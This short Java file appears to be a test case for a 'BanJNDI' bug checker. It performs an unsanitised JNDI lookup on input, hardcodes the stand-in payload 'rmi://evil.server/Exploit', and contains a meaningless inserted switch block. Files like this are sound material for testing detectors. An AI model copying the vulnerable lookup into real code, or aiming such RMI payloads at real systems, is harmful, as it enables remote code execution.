import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        int zpougfwh = 0;switch  (zpougfwh) {case 1:boolean vhtcljaf = false;break;default:short rlkffqkc = 228;break;}
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    
}

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}